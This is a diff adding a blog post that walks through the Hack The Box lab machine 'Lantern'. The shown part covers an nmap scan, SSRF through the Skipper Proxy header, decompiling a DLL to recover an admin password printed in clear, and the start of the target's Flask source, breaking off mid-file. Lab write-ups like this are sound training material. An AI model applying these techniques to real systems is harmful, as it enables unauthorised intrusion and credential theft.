@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/11/29/hackthebox-lantern/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewLantern is a hard-difficulty linux machine from Hack The Box. It initially deals with an SSRF exploit from the Skipper-Proxy to enumerate internal services, get and decompile a DLL which will">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Lantern">
+<meta property="og:url" content="http://foued-saidi.tech/2024/11/29/Hackthebox-Lantern/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewLantern is a hard-difficulty linux machine from Hack The Box. It initially deals with an SSRF exploit from the Skipper-Proxy to enumerate internal services, get and decompile a DLL which will">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/Lantern.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/web.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/web1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/rev.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/rev1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/rev2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/admin.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/admin2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/admin2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/BTP.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/exploit1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/exploit2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/exploit3.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/exploit4.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/rsa.png">
+<meta property="article:published_time" content="2024-11-29T10:09:07.000Z">
+<meta property="article:modified_time" content="2024-11-29T15:22:46.248Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Lantern/Lantern.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Lantern -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Lantern</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-29 11:09:07</span>
+        <span class="mobile">2024-11-29 11:09:07</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-29 16:22:46</span>
+            <span class="mobile">2024-11-29 16:22:46</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Lantern is a hard-difficulty linux machine from Hack The Box. It initially deals with an SSRF exploit from the Skipper-Proxy to enumerate internal services, get and decompile a DLL which will provide us with a password to get into an admin dashboard where we’ll be exploiting a path traversal vulnerability to load a malicious DLL by deserliazing Blazor traffic which will give us user flag. Finally we’ll be exploiting procmon to monitor an automation process owned by root to reach his password being written by the process.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/Lantern.png"
+                      alt="Lantern-info-card"
+                ><figcaption>Lantern-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">242.138</span> <span class="literal">--unprivileged</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-11-29</span> <span class="number">11</span>:<span class="number">11</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">242.138</span></span><br><span class="line">Host is up (<span class="number">0.35</span>s latency).</span><br><span class="line">Not shown: <span class="number">997</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">10</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> <span class="number">80</span>:c9:<span class="number">47</span>:d5:<span class="number">89</span>:f8:<span class="number">50</span>:<span class="number">83</span>:<span class="number">02</span>:<span class="number">5</span>e:fe:<span class="number">53</span>:<span class="number">30</span>:<span class="built_in">ac</span>:<span class="number">2</span>d:<span class="number">0</span>e (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> d4:<span class="number">22</span>:cf:fe:b1:<span class="number">00</span>:cb:eb:<span class="number">6</span>d:dc:b2:b4:<span class="number">64</span>:<span class="number">6</span>b:<span class="number">9</span>d:<span class="number">89</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Golang net/http server</span><br><span class="line">|_http<span class="literal">-server-header</span>: Skipper Proxy</span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://lantern.htb/</span><br><span class="line">| fingerprint<span class="literal">-strings</span>:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/<span class="number">1.0</span> <span class="number">404</span> Not Found</span><br><span class="line">|     Content<span class="literal">-Length</span>: <span class="number">207</span></span><br><span class="line">|     Content<span class="literal">-Type</span>: text/html; charset=utf<span class="literal">-8</span></span><br><span class="line">|     Date: Fri, <span class="number">29</span> Nov <span class="number">2024</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">42</span> GMT</span><br><span class="line">|     Server: Skipper Proxy</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=en&gt;</span><br><span class="line">|     &lt;title&gt;<span class="number">404</span> Not Found&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;The requested URL was not found on the server. <span class="keyword">If</span> you entered the URL manually please check your spelling and <span class="keyword">try</span> again.&lt;/p&gt;</span><br><span class="line">|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq:</span><br><span class="line">|     HTTP/<span class="number">1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line">|     Content<span class="literal">-Type</span>: text/plain; charset=utf<span class="literal">-8</span></span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/<span class="number">1.0</span> <span class="number">302</span> Found</span><br><span class="line">|     Content<span class="literal">-Length</span>: <span class="number">225</span></span><br><span class="line">|     Content<span class="literal">-Type</span>: text/html; charset=utf<span class="literal">-8</span></span><br><span class="line">|     Date: Fri, <span class="number">29</span> Nov <span class="number">2024</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">39</span> GMT</span><br><span class="line">|     Location: http://lantern.htb/</span><br><span class="line">|     Server: Skipper Proxy</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=en&gt;</span><br><span class="line">|     &lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=<span class="string">&quot;http://lantern.htb/&quot;</span>&gt;http://lantern.htb/&lt;/a&gt;. <span class="keyword">If</span> not, click the link.</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/<span class="number">1.0</span> <span class="number">200</span> OK</span><br><span class="line">|     Allow: GET, OPTIONS, HEAD</span><br><span class="line">|     Content<span class="literal">-Length</span>: <span class="number">0</span></span><br><span class="line">|     Content<span class="literal">-Type</span>: text/html; charset=utf<span class="literal">-8</span></span><br><span class="line">|     Date: Fri, <span class="number">29</span> Nov <span class="number">2024</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">40</span> GMT</span><br><span class="line">|_    Server: Skipper Proxy</span><br><span class="line"><span class="number">3000</span>/tcp open  http    Microsoft Kestrel httpd</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title (text/html; charset=utf-8).</span></span><br><span class="line"><span class="string">|_http-trane-info: Problem with XML parsing of /evox/about</span></span><br><span class="line"><span class="string">|_http-server-header: Kestrel</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">&lt;snip&gt;</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 89.99 seconds</span></span><br><span class="line"><span class="string">PS C:\Users\0xkujen&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have ssh 22 port open, a web application deployed on port 80 that’s redirecting us to <code>http://lantern.htb</code> so we could add that as an entry to our <code>/etc/hosts</code> and finally a Kestrel web server on port 3000.</p>
+<h3 id="Web-Application-http-lantern-htb"><a href="#Web-Application-http-lantern-htb" class="headerlink" title="Web Application - http://lantern.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://lantern.htb/" >http://lantern.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/web.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>This doesn’t seem to have anything special, let’s fire up Caido and see what the requests are hiding:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/web1.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure><br>Something really interesting is the presence of <code>Skipper Proxy</code> as part of the response so it’simplemented within our application.<br>Also navigating to port <code>3000</code> we get a lot of loaded blazor framework DLLs.<br>We can explore the blazor framework architecture through <a class="link"   target="_blank" rel="noopener" href="https://github.com/chanan/BlazorStyled/tree/master/docs/_framework" >this github repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<p>With a quick google search I stumbled upon <a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51111" >this exploit for the Skipper Proxy <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> where we could inject the <code>X-Skipper-Proxy</code> header to our request to exploit and SSRF vulnerability which will allow us to enumerate internal services.</p>
+<p>What we could do now is create a script to enumerate all internal services, but I used my ninja CTF skills and guessed a port which you find 90% of the time when it comes to internal services: <code>Port 5000</code>. Also the default paths to enumerate blazor are <code>_framework/blazor.boot.json</code> and  <code>/_framework/blazor.webassembly.js</code>:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/rev.png"
+                      alt="DLL"
+                ><figcaption>DLL</figcaption></figure></p>
+<p>We can see that there is a <code>InternaLantern</code> being loaded, so let’s go ahead download it(by navgating to <a class="link"   target="_blank" rel="noopener" href="http://lantern.htb/_framework/InternaLantern.dll" >http://lantern.htb/_framework/InternaLantern.dll <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and adding the proxy header) and open it with dotPeek:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/rev1.png"
+                      alt="DLL"
+                ><figcaption>DLL</figcaption></figure><br>Inside of our DLL, we find some weird strings that seem like base64-encoded strings, let’s get them all and download them then see what they hide from us.<br>In one of the strings, I find this interesting data:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/rev2.png"
+                      alt="DLL"
+                ><figcaption>DLL</figcaption></figure></p>
+<p>Now we have a username and password <code>admin:AJbFA_Q@925p9ap#22</code> that we could utilize to login in the admin portal at port 3000:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/admin.png"
+                      alt="DLL"
+                ><figcaption>DLL</figcaption></figure><br>And we are in!!</p>
+<h3 id="Web-Application-http-lantern-htb-3000-File-Disclosure"><a href="#Web-Application-http-lantern-htb-3000-File-Disclosure" class="headerlink" title="Web Application - http://lantern.htb:3000 - File Disclosure"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://lantern.htb:3000/" >http://lantern.htb:3000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - File Disclosure</h3><p>We have a lot of features on our dashboard, one of which is file upload and we could also read the source code of the app:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/admin2.png"
+                      alt="Admin Dashboard"
+                ><figcaption>Admin Dashboard</figcaption></figure></p>
+<p>app.py:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, send_file, request, redirect, json</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app=Flask(<span class="string">&quot;__name__&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.headers[<span class="string">&#x27;Host&#x27;</span>] != <span class="string">&quot;lantern.htb&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;http://lantern.htb/&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/vacancies&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vacancies</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;vacancies.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_vacancy</span>():</span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    email = request.form.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    vacancy = request.form.get(<span class="string">&#x27;vacancy&#x27;</span>, default=<span class="string">&#x27;Middle Frontend 